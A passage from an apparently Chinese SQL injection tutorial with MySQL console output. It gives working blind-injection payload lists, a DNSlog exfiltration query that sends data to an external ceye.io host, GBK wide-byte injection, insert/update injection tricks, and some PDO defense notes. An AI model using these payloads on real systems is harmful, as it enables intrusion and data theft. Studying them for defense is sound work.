class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;%es%&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;%es%&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断有几个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;_____&#39;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| database() like &#39;_____&#39; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select database() like &#39;____&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;____&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t___&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;t___&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>like配合盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">+------+-----------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注意点就是如果匹配成功就会返回1否则就是0。</p><p>REGEXP:</p><p>盲注值正则表达式攻击(^、&amp;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name from math where id&#x3D;3;</span><br><span class="line">+-----------+</span><br><span class="line">| name      |</span><br><span class="line">+-----------+</span><br><span class="line">| chengxian |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             0 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                                              1 |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#39;^r&#39;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>提高盲注速度</p><p>DNSlog+盲注</p><p><code>https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</code></p><p>原理：</p><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<a href="http://www.test.com、t00ls.com.等的访问信息./">www.test.com、t00ls.com.等的访问信息。</a></p><p>通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。</p><p>可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。<a href="http://ceye.io上我们可以获取到有关`ceye.io`的dns查询信息./">http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。</a></p><p>在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的NS服务器上，而通过<a href="http://ceye.io我们就可以查询到这条dns解析记录./">http://ceye.io我们就可以查询到这条DNS解析记录。</a></p><p>Microsoft SQL Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式：  \\ComputerName\SharedFolder\Resource</span><br><span class="line"></span><br><span class="line">攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。</span><br></pre></td></tr></table></figure><p>  条件：</p><p>  1、secure_file_priv为空</p><p>  2、目标系统是windows，能够使用UNC路径</p><p>  实例：</p><p>  构造sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\abc&#39;)))</span><br></pre></td></tr></table></figure><p>四个\，其中两个用来转义。<br>DNSlog平台接受信息<br><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200911100714531.png" alt="image-20200911100714531"></p></li></ul><h6 id="常用payload-1"><a href="#常用payload-1" class="headerlink" title="常用payload"></a>常用payload</h6><p>布尔盲注</p><p>判断数据库的类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">1&#x27; and exists(<span class="keyword">select</span>*<span class="keyword">from</span> information_schema.tables) <span class="comment">#</span></span><br><span class="line">//判断是否是 <span class="keyword">access</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and exists(select*from msysobjects) #</span></span><br><span class="line"><span class="string">//判断是否是 Sqlserver数据库</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span>*<span class="keyword">from</span> sysobjects) <span class="comment">#</span></span><br><span class="line">//判断是否是<span class="keyword">Oracle</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(*) from dual)&gt;0 #</span></span><br></pre></td></tr></table></figure><p>判断数据库长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(database())&gt;5 </span><br></pre></td></tr></table></figure><p>判断数据库的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;100</span><br></pre></td></tr></table></figure><p>判断数据库中是否存在某个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select*from admin)</span><br></pre></td></tr></table></figure><p>判断数据库中表的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;5 #</span><br></pre></td></tr></table></figure><p>判断数据库中表的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;6</span><br></pre></td></tr></table></figure><p>判断数据库中表的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 #</span><br></pre></td></tr></table></figure><p>判断数据库中的表中是否存在某个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select username from admin)</span><br></pre></td></tr></table></figure><p>判断数据库中的表的字段的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)&gt;5 #</span><br></pre></td></tr></table></figure><p>判断数据库中表的字段的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1))&gt;5</span><br></pre></td></tr></table></figure><p>判断数据库中表的字段的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure><p>判断字段中的数据的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select id from users limit 0,1))&gt;5</span><br></pre></td></tr></table></figure><p>判断字段中的数据的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span></span><br></pre></td></tr></table></figure><p>时间盲注</p><p>判断时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=5,1,sleep(5)) <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库的名字</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) #</span><br></pre></td></tr></table></figure><p>同理数据库的表、字段、值。</p><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。</p><p>比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。</p><p>应用程序的编码</p><p>以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启<code>default_charset</code>编码时，php的默认编码为空，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; PHP&#39;s built-in default is text&#x2F;html</span><br><span class="line">default_mimetype &#x3D; &quot;text&#x2F;html&quot;</span><br><span class="line">;default_charset &#x3D; &quot;iso-8859-1&quot;</span><br></pre></td></tr></table></figure><p>此时php会根据数据库中的编码自动来确定使用那种编码，可以使用<code>&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt;</code> 来进行判断，如果输出的值是3说明是<code>utf-8</code>编码。如果输出的值是2说明是<code>gbk</code>编码；</p><p><code>SET NAMES &#39;GBK&#39;</code>语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;;</span><br></pre></td></tr></table></figure><p>三个语句的作用是：</p><p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p><p>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p><p>使用<code>addslashes</code>函数或是开启<code>PHPGPC</code>（注：<code>在php5.4已上已给删除</code>，并且需要说明特别说明一点，GPC无法过滤<code>$_SERVER</code>提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure><p>比如我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;%df%27</span><br></pre></td></tr></table></figure><p>会被进行如下转换</p><p>%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ </p><p>因为数据库设置了<code>GBK</code>编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是<code>%df%5c</code>转换成了汉字<code>運</code>，而单引号就逃逸了出来，从而造成了注入漏洞。</p><p>防御：</p><p>对于宽字节编码，有一种最好的修补就是：</p><p>（1）使用mysql_set_charset(GBK)指定字符集</p><p>（2）使用mysql_real_escape_string进行转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。</span><br></pre></td></tr></table></figure><p>（3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p><h4 id="PDO技术"><a href="#PDO技术" class="headerlink" title="PDO技术"></a>PDO技术</h4><p>mysql的预编译</p><p>当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL<br>语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。</p><p>模拟预处理</p><p>模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行</p><p>模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。</p><p>非模拟预处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PDO::ATTR_EMULATE_PREPARES =&gt; <span class="literal">false</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$params = [</span><br><span class="line">    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">    PDO::ATTR_EMULATE_PREPARES  =&gt; <span class="literal">false</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, $params);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $link = $db-&gt;prepare(<span class="string">&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">    var_dump($e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程，</p><p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p><p>在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。</p><p>预编译可以完全杜绝注入攻击吗</p><p>在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。</p><p>总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、使用PDO时尽量使用非模拟预处理。</span><br><span class="line">2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。</span><br><span class="line">3、SQL语句模板不使用变量动态拼接生成</span><br></pre></td></tr></table></figure><p>关于orderby不能参数化查询的问题</p><p>原因：</p><ul><li><p>order by后面拼接字段名，字段名不能加引号。</p></li><li><p>在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。</p></li></ul><h5 id="insert、update注入"><a href="#insert、update注入" class="headerlink" title="insert、update注入"></a>insert、update注入</h5><h6 id="利用报错注入"><a href="#利用报错注入" class="headerlink" title="利用报错注入"></a>利用报错注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句</span><br><span class="line"> or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- </span><br></pre></td></tr></table></figure><h6 id="无回显注入-盲注"><a href="#无回显注入-盲注" class="headerlink" title="无回显注入(盲注)"></a>无回显注入(盲注)</h6><ul><li><p>利用xor、||、&amp;&amp;、+,-,*,/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (sleep(10));</span><br><span class="line">+-------------+</span><br><span class="line">| (sleep(10)) |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.09 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.01 sec)</span><br></pre></td></tr></table></figure><p>配合if、substr等函数进行盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (10.00 sec)</span><br></pre></td></tr></table></figure></li></ul><h6 id="有回显注入-符号"><a href="#有回显注入-符号" class="headerlink" title="有回显注入(符号)"></a>有回显注入(符号)</h6><ul><li><p>实例：</p><p>按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。</p><p>这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#int型按位或</span><br><span class="line">mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from steady;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657374 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">#int型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657338 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(100^74657338);</span><br><span class="line">+---------------------+</span><br><span class="line">| unhex(100^74657338) |</span><br><span class="line">+---------------------+</span><br><span class="line">| test                |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#字符型按位或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657374 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span 